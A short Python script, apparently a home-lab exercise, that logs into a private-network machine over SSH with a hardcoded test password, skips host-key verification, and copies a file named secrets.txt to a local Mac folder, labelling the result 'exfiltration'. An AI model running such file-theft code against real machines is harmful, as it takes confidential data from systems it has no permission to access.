import paramiko

host = "192.168.1.95"
utente = "labtest"
password = "Summer2026"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(hostname=host, username=utente, password=password, timeout=5,
                look_for_keys=False, allow_agent=False)

sftp = client.open_sftp()
sftp.get("/home/labtest/documenti/secrets.txt", "/Users/luigiderosa/pythonlab/secrets_esfiltrato.txt")
sftp.close()
client.close()

print("Exfiltration completata: file copiato sul Mac.")

